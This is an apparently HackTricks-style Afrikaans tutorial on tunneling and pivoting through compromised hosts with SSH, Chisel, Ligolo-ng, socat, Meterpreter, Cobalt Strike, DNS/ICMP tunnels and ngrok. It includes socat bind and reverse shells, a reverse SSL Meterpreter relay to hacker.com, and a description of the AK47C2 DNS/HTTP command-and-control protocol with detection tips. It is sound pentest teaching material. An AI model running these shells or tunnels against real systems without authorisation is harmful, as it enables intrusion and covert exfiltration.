# Tunneling en Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap-wenk

> [!WARNING]
> Nmap se proxy-ondersteuning is beperk tot TCP-verbindings en beïnvloed nie ping-, port- of OS-detection-skanderings nie. Wanneer die skandeerder agter ’n SOCKS-proxy is, **deaktiveer host discovery** (`-Pn`) en gebruik ’n **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Die finale opdrag gebruik Evil-WinRM se `-u`- en `-i`-opsies om die rekening en WinRM-host te identifiseer; sy verstek-WinRM-port is 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH kan X11-verbindings, arbitrêre TCP-poorte en Unix-domeinsokke oor sy geënkripteerde kanaal aanstuur.<sup>[[6]](#references)</sup>

SSH-grafiese verbinding (X)

`-Y` aktiveer vertroude X11-forwarding, en `-C` versoek kompressie vir aangestuurde data.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Open nuwe Port in SSH Server --> Ander port

Remote (`-R`) forwarding luister op die SSH-server en verbind met die plaaslike kant; die eksplisiete bind-adres beheer watter interfaces toegang tot daardie listener kan kry.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Plaaslike poort --> Gekompromitteerde gasheer (SSH) --> Third_box:Port

Plaaslike (`-L`) forwarding luister op die kliënt en verbind vanaf die SSH-bedienerkant met die bestemming.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Plaaslike poort --> Gekompromitteerde host (SSH) --> Enige plek

Dynamic (`-D`) forwarding skep 'n plaaslike SOCKS4/SOCKS5-listener waarvan die verbindings vanaf die afgeleë kant geopen word.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Dit is nuttig om reverse shells vanaf interne hosts deur ’n DMZ na jou host te kry:

Die bediener se `GatewayPorts`-instelling beheer of ’n remote forward buite loopback kan bind; die verstekwaarde is `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Hierdie root-gebaseerde voorbeeld skep tunnel-toestelle op albei gashere. Die server moet tun-forwarding toelaat, en die gekose rekening moet toegang tot die tun-toestel hê; `PermitRootLogin yes` is een manier om die `root`-rekening hier te gebruik.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Aktiveer forwarding aan die Server-kant
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Stel 'n nuwe roete aan die kliëntkant op
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Veiligheid – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 het 'n strict-KEX-uitbreiding bygevoeg om Terrapin se integriteitsaanval tydens vroeë transport teen te werk. Dateer albei peers op waar moontlik en volg vendor guidance vir ouer implementerings, eerder as om aan te neem dat 'n forwarded channel slegs op grond van die weergawe beskerm word.<sup>[[8]](#references)</sup>

## SSHUTTLE

Jy kan alle **traffic** via **ssh** deur 'n host na 'n **subnetwork** **tunnel**.\
Byvoorbeeld, om alle traffic wat na 10.10.10.0/24 gaan, aan te stuur.

`sshuttle` verskaf deursigtige proxying oor SSH en ondersteun die selektering van subnetworks en 'n custom SSH command soos hieronder getoon.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Koppel met 'n private sleutel
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit se `portfwd` ondersteun plaaslike en afgeleë forwarding, terwyl sy SOCKS proxy module bedoel is om met session routes of `autoroute` te werk en by verstek op poort 1080 in hierdie voorbeelde luister.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Plaaslike poort --> Gekompromitteerde host (aktiewe sessie) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Nog 'n manier:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike se Beacon kan SOCKS4a/SOCKS5-verbindings deur 'n Beacon herlei; `rportfwd` bind op die gekompromitteerde host, terwyl `rportfwd_local` die bestemmingsverbinding vanaf die Cobalt Strike-kliënt inisieer.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Maak 'n poort in die Team Server oop op die koppelvlakke wat verkeer deur die Beacon moet roeteer.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> In hierdie geval word die **port in die Beacon host oopgemaak**, nie in die Team Server nie, en die verkeer word na die Team Server gestuur en van daar af na die aangeduide host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Die reverse-forwarding-handleiding beskryf die volgende gedrag:<sup>[[14]](#references)</sup>

- Beacon se reverse port forward is ontwerp om **verkeer na die Team Server te tunnel, nie om tussen individuele masjiene te relay nie**.
- Verkeer word **binne Beacon se C2-verkeer getunnel**, insluitend P2P-skakels.
- Hoë ports vermy gewoonlik beperkings op bevoorregte ports, maar die teiken-OS se beleid en bestaande listeners geld steeds.

### rPort2Port local

> [!WARNING]
> In hierdie geval word die **port in die Beacon-host oopgemaak**, nie in die Team Server nie, en die **verkeer word na die Cobalt Strike-client gestuur** (nie na die Team Server nie) en van daar af na die aangeduide host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Die projek verskaf webtunnel-eindpunte soos `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` en `tunnel.php`; laai een ondersteunde eindpunt op voordat jy die plaaslike proxy begin.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Jy kan dit vanaf die releases page van [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) aflaai\
Chisel dra TCP/UDP-verkeer oor HTTP met behulp van ’n SSH-beskermde verbinding; gebruik versoenbare client/server-builds en verifieer die geselekteerde release se command-sintaksis.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Die Ligolo-ng quickstart beskryf ’n TUN interface op die proxy, certificate-fingerprint validation vir die agent, en route setup vir die tunneled network.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding en Listening

Ligolo-ng kan listeners op die agent byvoeg wat na 'n adres aan die proxy-kant aanstuur, en sy gereserveerde `240.0.0.0/4`-reeks kan gerouteer word om agent-plaaslike dienste te bereik.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Toegang tot Agent se Plaaslike Poorte
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot begin die reverse tunnel vanaf die slagoffer en stel ’n SOCKS4-proxy op die aanvaller se loopback-adres beskikbaar; sy README dokumenteer ook NTLM-proxy-geloofsbriewe en hash-opsies.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot deur **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kombineer adressoorte soos `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` en `PROXY`; die voorbeelde hieronder kombineer daardie gedokumenteerde eindpunte.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port deur socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter via SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Jy kan deur ’n **nie-geauthentiseerde proxy** beweeg met socat se gedokumenteerde `PROXY`-adres-tipe deur hierdie reël in plaas van die laaste een in die slagoffer se konsole uit te voer.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Skep sertifikate aan beide kante: Client en Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Verbind die plaaslike SSH-poort (22) met die 443-poort van die aanvallerhost
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink is PuTTY se command-line connection tool, met SSH forwarding options soortgelyk aan `ssh`.<sup>[[22]](#references)</sup>

Gebruik hoofletter `-P` vir die SSH-poort. `-pw` word vir compatibility behou, maar stel die wagwoord in die process list bloot; verkies key authentication of `-pwfile` waar moontlik.<sup>[[22]](#references)[[23]](#references)</sup>

Omdat hierdie binary op die victim uitgevoer sal word en dit 'n SSH-client is, maak die SSH-service en -poort oop vir die reverse connection; die volgende gebruik `-R` om 'n plaaslik toeganklike poort na die aanvaller se masjien te forward.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Gebruik 'n konteks met die toestemmings wat deur die gasheer vereis word wanneer jy aanhoudende `portproxy`-reëls skep of verander. Microsoft dokumenteer die `v4tov4`-vorms vir byvoeging, vertoon en verwydering wat hieronder gebruik word.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Jy moet **RDP-toegang tot die stelsel hê**.\
Laai af:

SocksOverRDP gebruik Remote Desktop Dynamic Virtual Channels om ’n SOCKS5-verbinding oor ’n bestaande RDP-sessie te dra; die kliënt-inprop luister op `127.0.0.1:1080`, terwyl die bedienerkomponent op die RDP-teiken loop.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binêre](https://github.com/nccgroup/SocksOverRDP/releases) - Hierdie tool gebruik `Dynamic Virtual Channels` (`DVC`) van die Remote Desktop Service-funksie van Windows. DVC is verantwoordelik vir **die tunneling van pakkette oor die RDP-verbinding**.
2. [Proxifier Draagbare Binêre](https://www.proxifier.com/download/#win-tab)

Laai **`SocksOverRDP-Plugin.dll`** op jou kliëntrekenaar soos volg:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Nou kan ons aan die **victim** koppel oor **RDP** met **`mstsc.exe`**, en ons behoort ’n **prompt** te ontvang wat aandui dat die **SocksOverRDP plugin** geaktiveer is en op **127.0.0.1:1080** sal **listen**.

**Koppel** via **RDP** en laai die `SocksOverRDP-Server.exe`-binary op die victim-masjien op en voer dit uit:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Bevestig nou op jou masjien (aanvaller) dat poort 1080 luister:
```
netstat -antb | findstr 1080
```
Nou kan jy [**Proxifier**](https://www.proxifier.com/) gebruik om die verkeer deur daardie poort te proxy.<sup>[[26]](#references)</sup>

## Proxify Windows GUI-toepassings

Jy kan Windows GUI-toepassings deur ’n proxy laat navigeer deur [**Proxifier**](https://www.proxifier.com/) te gebruik.<sup>[[26]](#references)</sup>\
In **Profile -> Proxy Servers**, voeg die IP en poort van die SOCKS-bediener by.\
In **Profile -> Proxification Rules**, voeg die naam van die program wat geproxify moet word en die verbindings na die IP’s wat jy wil proxify by; Proxifier-reëls kan toepassings, teikenhosts en poorte pas.<sup>[[27]](#references)</sup>

## Tonnel deur ’n NTLM-proxy

Die voorheen genoemde tool, **Rpivot**, kan deur ’n NTLM-authentiserende proxy relay. **OpenVPN** kan ook deur een roeteer wanneer dit met ’n auth-lêer en die NTLMv2-metode gekonfigureer is; dit is proxy traversal, nie ’n omseiling van proxyauthentisering nie.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm verifieer by upstream NTLM-proxies, stel plaaslike luisteraars bloot en kan ’n plaaslike tunnelpoort na ’n bestemmingsdiens karteer; clients kan dan daardie plaaslike poort gebruik.<sup>[[29]](#references)</sup>\
Byvoorbeeld, daardie forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Nou, as jy byvoorbeeld die **SSH**-diens op die slagoffer instel om op poort 443 te luister, kan jy daardeur via aanvallerpoort 2222 koppel.<sup>[[29]](#references)</sup>\
Jy kan ook ’n **meterpreter** gebruik wat aan localhost:443 koppel terwyl die aanvaller op poort 2222 luister.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) is Microsoft se .NET reverse-proxy toolkit. Jy kan dit hier vind: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine skep ’n IPv4-tunnel deur DNS-navrae en gebruik TUN-koppelvlakke; die gedokumenteerde opstelling vereis die voorregte wat nodig is om daardie koppelvlakke aan albei kante te skep.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS-vervoer het meer overhead as direkte TCP en is tipies stadig; jy kan ’n saamgeperste SSH-verbinding deur hierdie tonnel skep deur die volgende te gebruik:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Laai dit hier af**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 stel 'n geënkripteerde command-and-control-kanaal deur DNS op; die server- en client-opdragte hieronder volg die gedokumenteerde gebruik daarvan.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Jy kan [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) gebruik om ’n dnscat2-client in PowerShell uit te voer; die README dokumenteer die `Start-Dnscat2`-parameters wat hieronder getoon word.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding with dnscat**

Dnscat2 se interaktiewe `listen`-command karteer ’n plaaslike listener na ’n afgeleë host en port.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Verander proxychains DNS

Proxychains-ng haak dinamies-gelinkte TCP-verbindings in en kan nie UDP of ICMP dra nie; DNS-proxying is konfigureerbaar, dus inspekteer die geïnstalleerde `proxychains.conf` en resolver-helper eerder as om 'n vaste publieke resolver te aanvaar. Legacy `proxyresolv`-scripts stel `PROXY_DNS_SERVER` bloot om die resolver te kies; gebruik 'n resolver wat vanaf die pivot bereikbaar is wanneer interne name benodig word.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Pasgemaakte DNS TXT / HTTP JSON C2 (AK47C2)

Die Storm-2603-actor het 'n **dubbelkanaal-C2 ("AK47C2")** geskep wat *slegs* uitgaande **DNS**- en **gewone HTTP POST**-verkeer misbruik – twee protokolle wat selde op korporatiewe netwerke geblokkeer word.<sup>[[2]](#references)</sup>

1. **DNS-modus (AK47DNS)**
• Genereer 'n ewekansige 5-karakter-SessionID (bv. `H4T14`).
• Voeg `1` voor vir *taakversoeke* of `2` vir *resultate* en aaneen verskillende velde (vlae, SessionID, rekenaarnaam).
• Elke veld word **XOR-geënkripteer met die ASCII-sleutel `VHBD@H`**, hex-geënkodeer en met punte aanmekaargeheg – en eindig uiteindelik met die aanvallerbeheerde domein:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Versoeke gebruik `DnsQuery()` vir **TXT**- (en terugval-**MG**-)rekords.
• Wanneer die respons 0xFF-grepe oorskry, **fragmenteer** die backdoor die data in 63-greep-stukke en voeg die merkers in:
`s<SessionID>t<TOTAL>p<POS>` sodat die C2-bediener hulle kan herrangskik.

2. **HTTP-modus (AK47HTTP)**
• Bou 'n JSON-omhulsel:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Die hele blob word XOR-`VHBD@H` → hex → as die liggaam van 'n **`POST /`** met header `Content-Type: text/plain` gestuur.
• Die antwoord volg dieselfde enkodering en die `cmd`-veld word uitgevoer met `cmd.exe /c <command> 2>&1`.

Blue Team-notas
• Soek na ongewone **TXT-navrae** waarvan die eerste label lang heksadesimale data bevat en wat altyd met een seldsame domein eindig.
• 'n Konstante XOR-sleutel gevolg deur ASCII-hex is maklik om met YARA op te spoor: `6?56484244?484` (`VHBD@H` in hex).
• Vir HTTP, merk text/plain POST-liggame wat suiwer hex is en 'n veelvoud van twee grepe bevat.

{{#note}}
Die kanaal hou elke subdomein-label binne die 63-oktet DNS-limiet, maar protokolnakoming alleen maak dit nie stealthy nie; seldsame domeine, lang heksadesimale labels en navraagvolume bly opsporingsseine.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP-tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans dokumenteer 'n IPv4-oor-ICMP-tunnel wat 'n TUN-device en ICMP-echo-versoeke gebruik; die opstelling vereis voldoende privileges om die koppelvlak te skep.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Laai dit hier af**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng vervoer TCP-verbindings oor ICMP en gebruik die `-p`, `-l`, `-r` en `-R`-opsies hieronder vir die proxy, plaaslike listener, bestemminggasheer en bestemmingspoort.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) is 'n agent om plaaslike netwerkdienste deur 'n veilige tunnel aanlyn beskikbaar te stel; sy CLI dokumenteer HTTP-, TCP- en lêer-URL-endpoints, en die gedrukte endpoint-gasheernaam kan volgens die endpoint en rekening verskil.<sup>[[39]](#references)</sup>

### Installasie

- Skep 'n rekening: https://ngrok.com/signup
- Client-aflaai:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Basiese gebruik

**Dokumentasie:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Die agent ondersteun ook authentication- en TLS-opsies wanneer nodig.<sup>[[39]](#references)</sup>_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Lêers met HTTP blootstel
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing van HTTP-oproepe

_Nuttig vir XSS,SSRF,SSTI ..._\
Die standalone agent stel sy HTTP-inspeksie-koppelvlak by verstek bloot by `http://127.0.0.1:4040`; die koppelvlak is vir HTTP-verkeer.<sup>[[40]](#references)</sup>

#### Tunneling van interne HTTP-diens

Die `--host-header=rewrite`-opsie herskryf die upstream HTTP `Host`-header om by die plaaslike diens te pas.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml eenvoudige konfigurasievoorbeeld

Dit gebruik ngrok Agent Config v2; benoemde tunnels gebruik `proto` en `addr` en word met `ngrok start` begin.<sup>[[42]](#references)</sup> Dit maak 3 tunnels oop:

- 2 TCP
- 1 HTTP met bediening van statiese lêers vanaf /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel se `cloudflared`-connector stel uitgaande verbindings daar; gepubliseerde toepassings kan HTTP, HTTPS, TCP, SSH en RDP roeteer, terwyl quick tunnels vir HTTP-ontwikkeling bedoel is.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (legacy mode)

Die legacy `--socks5`-vlag dui aan `cloudflared` dat die plaaslike origin SOCKS5 gebruik; dit skep nie ’n plaaslike SOCKS5-listener nie. Vir ’n managed tunnel stel `originRequest.proxyType: socks` SOCKS5-origin-hantering op.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### Persistent tunnels with DNS

Plaaslik bestuurde tunnelkonfigurasie gebruik die kleinletter-`tunnel`, `credentials-file` en `url`-sleutels soos hieronder getoon.<sup>[[46]](#references)</sup>
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Begin die connector:
```bash
cloudflared tunnel run mytunnel
```
